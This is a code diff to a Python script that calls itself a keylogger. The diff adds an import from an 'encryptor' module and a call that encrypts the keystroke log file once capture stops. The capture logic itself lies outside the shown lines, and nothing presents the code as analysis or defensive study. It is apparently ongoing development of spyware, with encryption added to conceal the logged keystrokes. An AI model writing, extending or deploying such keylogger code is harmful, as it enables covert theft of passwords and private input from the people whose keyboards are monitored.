@@ -4,6 +4,8 @@ import os
 import time
 import threading
 import datetime
+from encryptor import encrypt_file, decrypt_file    
+
 
 log_file= None
 
@@ -58,16 +60,24 @@ def start_keylogger():
     logging.info("Keylogger stopped.")
     return log_file
 
+
+
+
+
+
 def main():
     """Main function to run the keylogger."""
     try:
         log_file = start_keylogger()
         print(f"Keylogger is running. Logs are being saved to {log_file}")
+        encrypt_file(log_file)  
     except Exception as e:
         logging.error(f"An error occurred: {e}")
         print("An error occurred while starting the keylogger.")
     finally:
         print("Keylogger has stopped.")
+
+        
 if __name__ == "__main__":
     main()
 
